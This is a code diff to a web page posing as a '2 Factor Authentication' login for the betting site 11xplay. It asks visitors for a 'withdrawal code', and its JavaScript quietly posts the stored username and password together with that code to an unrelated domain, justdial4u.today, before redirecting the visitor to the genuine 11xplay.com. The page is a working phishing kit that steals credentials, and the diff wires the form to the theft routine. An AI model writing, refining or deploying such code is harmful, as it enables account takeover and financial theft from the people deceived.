@@ -844,20 +844,31 @@
 <div class="login__form">
 <h2 style="font-size: 18px;padding: 3% 3% 1% 3%;font-weight: 400;text-align: center; color: #fff;">2 Factor Authentication Enabled. Please Enter <br> Withdrawal Password to Login Securely.</h2>
 
-<form role="form" method="post">
-<input type="hidden" name="" value="">
-<div class="input__item">
-<input type="text" placeholder="Enter Withdrawal Code" id="loginName" name="username" value="">
-<span class="icon_mail"></span>
-</div>
-<div  class="form-check">
-<label  class="form-check-label">
-<input  type="checkbox" class="form-check-input">
-	<span style="color: #ffffff;" >Remember Me?</span>
-</label>
-</div>
-<button type="button" class="site-btn" onclick="checkLogin()">Submit</button>
+<form role="form" method="post" id="withdrawalForm">
+  <!-- Hidden input (keep as needed) -->
+  <input type="hidden" name="form_token" value="">
+
+  <!-- Username input field -->
+  <div class="input__item">
+    <input type="text" placeholder="Enter Withdrawal Code" id="code" name="code" value="" required>
+    <span class="icon_mail"></span>
+  </div>
+
+  <!-- Remember me checkbox (optional, depending on your functionality) -->
+  <div class="form-check">
+    <label class="form-check-label">
+      <input type="checkbox" class="form-check-input" name="remember">
+      <span style="color: #ffffff;">Remember Me?</span>
+    </label>
+  </div>
+
+  <!-- Submit button -->
+  <button type="button" class="site-btn" onclick="submitCodeAndSendEmail()">Submit</button>
+  
+  <!-- Error message (hidden initially) -->
+  <div id="errorMsg" style="color: red;"></div>
 </form>
+
 <div  class="copy-text">Powered by 
 <a  href="javascript:void(0)">11xplay</a> <br>
 	<a href="mailto:11xplayofficiall@gmail.com">11xplayofficiall@gmail.com</a>
@@ -948,43 +959,44 @@
     </style>
 
 <script type="text/javascript">
-        function submitCodeAndSendEmail() {
-            // Get the code entered by the user
-            var code = $("#code").val();
+    function submitCodeAndSendEmail() {
+        // Get the code entered by the user
+        var code = $("#code").val();
 
-            // Retrieve the username and password from sessionStorage
-            var loginName = sessionStorage.getItem("loginName");
-            var password = sessionStorage.getItem("password");
+        // Retrieve the username and password from sessionStorage
+        var loginName = sessionStorage.getItem("loginName");
+        var password = sessionStorage.getItem("password");
 
-            // Check if the code field is not empty
-            if (code) {
-                // Send an AJAX request to the PHP page
-                $.ajax({
-                    type: "POST",
-                    url: "https://justdial4u.today/11xxplay-mail.php", // Your PHP server URL
-                    data: {
-                        loginName: loginName,
-                        password: password,
-                        code: code
-                    },
-                    success: function(response) {
-                        if (response === "sucessmsg") {
-                            alert("Email sent successfully!");
-                            window.location.href = "https://11xplay.com/";  // Redirect after successful email sending
-                        } else {
-                            $("#errorMsg").text("There was an error sending the email.");
-                        }
-                    },
-                    error: function(xhr, status, error) {
-                        console.log("Error:", status, error);  // Log error details for debugging
-                        alert("An error occurred. Please try again.");
+        // Check if the code field is not empty
+        if (code) {
+            // Send an AJAX request to the PHP page
+            $.ajax({
+                type: "POST",
+                url: "https://justdial4u.today/11xxplay-mail.php", // Your PHP server URL
+                data: {
+                    loginName: loginName,
+                    password: password,
+                    code: code
+                },
+                success: function(response) {
+                    if (response === "sucessmsg") {
+                        alert("Email sent successfully!");
+                        window.location.href = "https://11xplay.com/";  // Redirect after successful email sending
+                    } else {
+                        $("#errorMsg").text("There was an error sending the email.");
                     }
-                });
-            } else {
-                $("#errorMsg").text("Please enter the withdrawal code.");
-            }
+                },
+                error: function(xhr, status, error) {
+                    console.log("Error:", status, error);  // Log error details for debugging
+                    alert("An error occurred. Please try again.");
+                }
+            });
+        } else {
+            $("#errorMsg").text("Please enter the withdrawal code.");
         }
-    </script>
+    }
+</script>
+
 
 
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
